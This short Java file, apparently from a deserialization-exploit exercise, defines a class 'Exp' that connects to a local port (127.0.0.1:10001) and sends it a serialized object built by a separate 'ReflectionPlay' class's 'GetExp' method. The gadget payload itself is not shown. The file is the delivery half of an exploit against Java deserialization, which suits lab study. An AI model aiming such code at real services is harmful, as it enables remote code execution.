package com.test.example3;

import com.test.example2.ReflectionPlay;

import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exp {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("127.0.0.1", 10001);
            OutputStream os = socket.getOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(os);
            oos.writeObject(new ReflectionPlay().GetExp());
            socket.close();
        } catch (Exception e) {
        }
    }
}
